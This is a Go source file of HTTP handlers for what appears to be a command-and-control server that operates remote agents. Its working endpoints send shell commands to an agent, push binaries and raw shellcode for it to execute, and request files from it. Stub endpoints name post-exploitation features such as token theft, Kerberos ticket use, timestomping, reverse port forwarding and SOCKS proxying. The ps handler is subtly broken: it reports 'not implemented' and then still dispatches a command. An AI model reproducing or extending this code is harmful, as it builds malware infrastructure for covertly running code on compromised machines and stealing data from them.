package handlers

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/Connduit/frazzledrip/server/backend/models"
	"github.com/Connduit/frazzledrip/server/backend/network"
	"github.com/Connduit/frazzledrip/server/backend/utils"
)

// =========================
//
//	POST /download-file
//
// =========================
// Reports whether the download-to-server request was sent.
// Sending a request does not confirm that the file has been received.
func downloadFilePlaceholderHandler(w http.ResponseWriter, r *http.Request) {
	if !requireControlMethod(w, r, http.MethodPost) {
		return
	}
	var request struct {
		AgentID string `json:"agent_id"`
		Path    string `json:"path"`
	}
	decoder := json.NewDecoder(http.MaxBytesReader(w, r.Body, 16384))
	if err := decoder.Decode(&request); err != nil {
		controlError(w, http.StatusBadRequest, "A JSON body with a file path is required.")
		return
	}
	if err := decoder.Decode(new(any)); err != io.EOF || strings.TrimSpace(request.AgentID) == "" || strings.TrimSpace(request.Path) == "" || len(request.Path) > 4096 {
		controlError(w, http.StatusBadRequest, "Provide one JSON object with agent_id and a nonempty file path of at most 4096 bytes.")
		return
	}
	var selectedClient *models.Client
	for _, client := range network.GetAllClients() {
		if client.ID != request.AgentID {
			continue
		}
		selectedClient = client
		break
	}
	if selectedClient == nil {
		controlError(w, http.StatusNotFound, "Session not found. No request was sent to the client.")
		return
	}
	clientAddr := selectedClient.IPAddress

	// Attempt to send upload request to active agent
	if err := network.SendUploadRequestToClient(clientAddr, request.Path); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send command: " + err.Error(),
		})
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusAccepted)
	json.NewEncoder(w).Encode(map[string]string{
		"status": fmt.Sprintf("Download request sent for %q. File receipt has not been confirmed.", request.Path),
	})
}

// =========================
//
//	GET /client/messages
//
// =========================
// Returns the client's metadata + last 100 messages
func getClientMessagesHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	// Extract client ID from query
	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	// Look up client in active connection map
	client, exists := network.GetClient(clientID)
	if !exists {
		// Still return JSON for consistent frontend handling
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Client not found",
		})
		return
	}

	// Build response containing both metadata and message history
	response := map[string]interface{}{
		"client": map[string]interface{}{
			"id":          client.ID,
			"ip_address":  client.IPAddress,
			"last_seen":   client.LastSeen,
			"system_info": client.SystemInfo, // TODO: remove?
		},
		"messages": client.Messages, // last 100 messages
	}

	json.NewEncoder(w).Encode(response)
}

// =========================
//
//	POST /command
//
// =========================
// Sends a text command to the agent (EXECUTE_COMMAND).
// The agent executes it and returns MESSAGE_COMMAND_RESULT.
// This is ONLY for shell/console commands.
func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	// Handle preflight request
	if r.Method == "OPTIONS" {
		return
	}

	// Decode JSON request body
	var cmdReq models.CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Attempt to send command to active agent
	if err := network.SendCommandToClient(cmdReq.Client, cmdReq.Command); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send command: " + err.Error(),
		})
		return
	}

	// Success
	json.NewEncoder(w).Encode(map[string]string{
		"status": "✅ Command sent to " + cmdReq.Client,
	})
}

// =========================
//
//	POST /myCommand
//
// =========================
// TODO:
func mySendCommandHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	// Handle preflight request
	if r.Method == "OPTIONS" {
		return
	}

	// Decode JSON request body
	var cmdReq models.CommandRequest // TODO: change?
	if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Attempt to send command to active agent
	if err := network.SendMyCommandToClient(cmdReq.Client, cmdReq.Command); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send command: " + err.Error(),
		})
		return
	}

	// Success
	json.NewEncoder(w).Encode(map[string]string{
		"status": "✅ Command sent to " + cmdReq.Client,
	})
}

// =========================
//
//	POST /send-binary
//
// =========================
// Uploads a binary EXE (or any file) and pushes it to the agent.
// This corresponds to your MESSAGE_UPLOAD_FILE message type.
func sendBinaryHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	if r.Method == "OPTIONS" {
		return
	}

	// Parse multipart form data (max 32MB)
	if err := r.ParseMultipartForm(32 << 20); err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		return
	}

	clientAddr := r.FormValue("client")

	// Extract uploaded file
	file, _, err := r.FormFile("binaryFile")
	if err != nil {
		http.Error(w, "Failed to get file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// Read binary contents into memory
	binaryData, err := io.ReadAll(file)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to read binary file: " + err.Error(),
		})
		return
	}

	// Send to agent
	if err := network.SendFileToClient(clientAddr, binaryData); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send file: " + err.Error(),
		})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"status": fmt.Sprintf("✅ File sent (%d bytes) to %s", len(binaryData), clientAddr),
	})
}

// =========================
//
//	POST /send-shellcode
//
// =========================
// Uploads raw shellcode (.bin or .raw) and sends it to the client.
// This triggers your MESSAGE_EXECUTE_SHELL_CODE behavior.
func sendShellcodeHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	if r.Method == "OPTIONS" {
		return
	}

	// Parse multipart (max 32MB)
	if err := r.ParseMultipartForm(32 << 20); err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		return
	}

	clientAddr := r.FormValue("client")

	// Extract shellcode file
	file, _, err := r.FormFile("shellcodeFile")
	if err != nil {
		http.Error(w, "Failed to get shellcode file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// Read entire shellcode file
	shellcodeData, err := io.ReadAll(file)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to read shellcode: " + err.Error(),
		})
		return
	}

	// Send payload to agent
	if err := network.SendShellcodeToClient(clientAddr, shellcodeData); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send shellcode: " + err.Error(),
		})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"status": fmt.Sprintf("✅ Shellcode sent (%d bytes) to %s", len(shellcodeData), clientAddr),
	})
}

// =========================
//
//	GET /client/info
//
// =========================
// Returns ONLY system info for a specific client.
func getClientInfoHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	// Look up the client
	client, exists := network.GetClient(clientID)
	if !exists {
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Client not found",
		})
		return
	}

	// Return system information directly
	json.NewEncoder(w).Encode(client.SystemInfo) // TODO: remove?
}

// notImplementedCommand reports unsupported commands without processing their payload
// or dispatching any client message.
func notImplementedCommand(w http.ResponseWriter, r *http.Request, command string) {
	if !requireControlMethod(w, r, http.MethodPost) {
		return
	}
	controlError(w, http.StatusNotImplemented, command+" is not implemented. No request was sent to the client.")
}

// =========================
//
// POST /commands/screenshot
//
// =========================
// Returns a not-implemented response for SCREENSHOT; no client operation is performed.
func screenshotHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "SCREENSHOT")
}

// =========================
//
// POST /commands/cd
//
// =========================
// Returns a not-implemented response for CD; no client operation is performed.
func cdHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "CD")
}

// =========================
//
// POST /commands/cp
//
// =========================
// Returns a not-implemented response for CP; no client operation is performed.
func cpHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "CP")
}

// =========================
//
// POST /commands/drives
//
// =========================
// Returns a not-implemented response for DRIVES; no client operation is performed.
func drivesHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "DRIVES")
}

// =========================
//
// POST /commands/exit
//
// =========================
// Returns a not-implemented response for EXIT; no client operation is performed.
func exitHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "EXIT")
}

// =========================
//
// POST /commands/getprivs
//
// =========================
// Returns a not-implemented response for GETPRIVS; no client operation is performed.
func getprivsHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "GETPRIVS")
}

// =========================
//
// POST /commands/getuid
//
// =========================
// Returns a not-implemented response for GETUID; no client operation is performed.
func getuidHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "GETUID")
}

// =========================
//
// POST /commands/kerberos-ccache-use
//
// =========================
// Returns a not-implemented response for KERBEROS_CCACHE_USE; no client operation is performed.
func kerberosCcacheUseHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "KERBEROS_CCACHE_USE")
}

// =========================
//
// POST /commands/kerberos-ticket-purge
//
// =========================
// Returns a not-implemented response for KERBEROS_TICKET_PURGE; no client operation is performed.
func kerberosTicketPurgeHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "KERBEROS_TICKET_PURGE")
}

// =========================
//
// POST /commands/kerberos-ticket-use
//
// =========================
// Returns a not-implemented response for KERBEROS_TICKET_USE; no client operation is performed.
func kerberosTicketUseHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "KERBEROS_TICKET_USE")
}

// =========================
//
// POST /commands/jobkill
//
// =========================
// Returns a not-implemented response for JOBKILL; no client operation is performed.
func jobkillHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "JOBKILL")
}

// =========================
//
// POST /commands/kill
//
// =========================
// Returns a not-implemented response for KILL; no client operation is performed.
func killHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "KILL")
}

// =========================
//
// POST /commands/link
//
// =========================
// Returns a not-implemented response for LINK; no client operation is performed.
func linkHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "LINK")
}

// =========================
//
// POST /commands/ls
//
// =========================
// Returns a not-implemented response for LS; no client operation is performed.
func lsHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "LS")
}

// =========================
//
// POST /commands/make-token
//
// =========================
// Returns a not-implemented response for MAKE_TOKEN; no client operation is performed.
func makeTokenHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "MAKE_TOKEN")
}

// =========================
//
// POST /commands/mkdir
//
// =========================
// Returns a not-implemented response for MKDIR; no client operation is performed.
func mkdirHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "MKDIR")
}

// =========================
//
// POST /commands/mv
//
// =========================
// Returns a not-implemented response for MV; no client operation is performed.
func mvHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "MV")
}

// =========================
//
// POST /commands/ppid
//
// =========================
// Returns a not-implemented response for PPID; no client operation is performed.
func ppidHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "PPID")
}

// =========================
//
// POST /commands/ps
//
// =========================
// Returns a not-implemented response for PS; no client operation is performed.
func psHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "PS")
	//utils.EnableCORS(&w, r)

	// Handle preflight request
	if r.Method == "OPTIONS" {
		return
	}

	// Decode JSON request body
	var cmdReq models.CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Attempt to send command to active agent
	if err := network.SendCommandToClient(cmdReq.Client, cmdReq.Command); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send command: " + err.Error(),
		})
		return
	}

	// Success
	json.NewEncoder(w).Encode(map[string]string{
		"status": "✅ Command sent to " + cmdReq.Client,
	})
}

// =========================
//
// POST /commands/pwd
//
// =========================
// Returns a not-implemented response for PWD; no client operation is performed.
func pwdHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "PWD")
}

// =========================
//
// POST /commands/reg-query
//
// =========================
// Returns a not-implemented response for REG_QUERY; no client operation is performed.
func regQueryHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "REG_QUERY")
}

// =========================
//
// POST /commands/reg-queryv
//
// =========================
// Returns a not-implemented response for REG_QUERYV; no client operation is performed.
func regQueryvHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "REG_QUERYV")
}

// =========================
//
// POST /commands/rev2self
//
// =========================
// Returns a not-implemented response for REV2SELF; no client operation is performed.
func rev2selfHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "REV2SELF")
}

// =========================
//
// POST /commands/rm
//
// =========================
// Returns a not-implemented response for RM; no client operation is performed.
func rmHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "RM")
}

// =========================
//
// POST /commands/rportfwd
//
// =========================
// Returns a not-implemented response for RPORTFWD; no client operation is performed.
func rportfwdHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "RPORTFWD")
}

// =========================
//
// POST /commands/setenv
//
// =========================
// Returns a not-implemented response for SETENV; no client operation is performed.
func setenvHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "SETENV")
}

// =========================
//
// POST /commands/socks
//
// =========================
// Returns a not-implemented response for SOCKS; no client operation is performed.
func socksHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "SOCKS")
}

// =========================
//
// POST /commands/steal-token
//
// =========================
// Returns a not-implemented response for STEAL_TOKEN; no client operation is performed.
func stealTokenHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "STEAL_TOKEN")
}

// =========================
//
// POST /commands/timestomp
//
// =========================
// Returns a not-implemented response for TIMESTOMP; no client operation is performed.
func timestompHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "TIMESTOMP")
}

// =========================
//
// POST /commands/unlink
//
// =========================
// Returns a not-implemented response for UNLINK; no client operation is performed.
func unlinkHandler(w http.ResponseWriter, r *http.Request) {
	notImplementedCommand(w, r, "UNLINK")
}
